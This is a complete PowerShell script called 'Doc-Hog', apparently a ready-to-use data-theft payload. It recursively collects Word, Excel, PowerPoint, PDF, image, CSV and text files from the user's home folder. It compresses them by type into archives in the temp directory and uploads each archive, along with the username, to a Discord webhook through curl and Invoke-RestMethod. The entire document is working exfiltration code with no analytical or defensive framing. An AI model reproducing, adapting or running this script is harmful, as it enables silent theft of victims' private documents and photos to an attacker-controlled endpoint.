function Doc-Hog {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'DISCORD-WEBHOOK'

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

$Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse

$types = @{
    "*.docx" = "Word";
    "*.doc" = "Word";
    "*.pptx" = "PowerPoint";
    "*.xlsx" = "Excel";
    "*.pdf" = "PDF";
    "*.jpeg" = "JPEG";
    "*.png" = "PNG";
    "*.jpg" = "JPEG";
    "*.csv" = "CSV";
    "*.txt" = "Text";
}

foreach ($type in $types.Keys) {
    $filteredFiles = $Files | Where-Object {$_.Name -like $type}

    if ($filteredFiles) {
        $zipFile = "$env:TEMP\$($types[$type]).zip"

        $filteredFiles | Compress-Archive -DestinationPath $zipFile

        Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
    }
}
